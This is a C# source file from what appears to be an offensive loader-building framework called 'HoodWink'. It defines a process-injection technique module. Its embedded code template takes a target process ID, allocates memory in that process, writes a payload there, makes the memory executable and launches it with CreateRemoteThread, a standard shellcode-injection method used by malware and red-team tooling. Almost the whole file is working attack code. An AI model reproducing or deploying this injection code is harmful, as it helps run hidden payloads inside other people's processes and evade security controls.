using System.Collections.Generic;

namespace HoodWink.Languages.Csharp.Techniques
{
    public class Remote_CreateRemoteThread : Models.Base.Technique
    {
        public override string Description => "Inject via CreateRemoteThread";
        public override List<string> FileDependencies => new List<string> { @"Languages\Csharp\FileDependencies\Kernel32.cs" };

        public override string Using => @"using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using HoodWink.Languages.Csharp.FileDependencies;";

        public override string ApiImports => @"// to allocate mem
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();";

        public override string MainLogic => @"
      
         int pid = int.Parse(args[0]); // No Cheking on arg
         var target = Process.GetProcessById(pid);
         var baseAddress = Kernel32.VirtualAllocEx(target.Handle,
                 IntPtr.Zero,
                 payload.Length,
                 Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                 Kernel32.MemoryProtection.ReadWrite);

         Kernel32.WriteProcessMemory(
             target.Handle,
             baseAddress,
             payload,
             payload.Length,
             out _);

         Kernel32.VirtualProtectEx(
             target.Handle,
             baseAddress,
             payload.Length,
             Kernel32.MemoryProtection.ExecuteRead,
             out _);

         Kernel32.CreateRemoteThread(
             target.Handle,
             IntPtr.Zero,
             0,
             baseAddress,
             IntPtr.Zero,
             0,
             out var threadId);

         // return threadId != IntPtr.Zero;";

        public override string AdditionalFunctions => @"//Remote_CreateRemoteThread Additional Functions";
    }
}